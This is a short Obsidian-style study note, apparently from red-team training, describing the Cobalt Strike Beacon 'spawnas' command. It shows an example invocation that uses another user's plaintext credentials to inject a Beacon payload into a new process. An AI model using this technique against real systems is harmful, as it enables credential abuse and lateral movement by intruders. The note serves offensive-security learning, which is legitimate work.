---
creation date: September 23rd 2022
last modified date: September 23rd 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[SpawnAs]]  
___

## Description:  
The `spawnas` command will spawn a new process using the plaintext credentials of another user and inject a Beacon payload into it. This creates a new logon session with the interactive logon type, which makes it good for local actions, but also creates a whole user profile on disk if not already present.

Attempt this from a directory where the target user has read access.

This command does not require local admin privileges and will also usually fail if run from a SYSTEM Beacon.

```
beacon> spawnas DEV\jking Purpl3Drag0n tcp-4444-local
[+] established link to child beacon: 10.10.17.231
```



___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 23rd 2022 (05:14 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
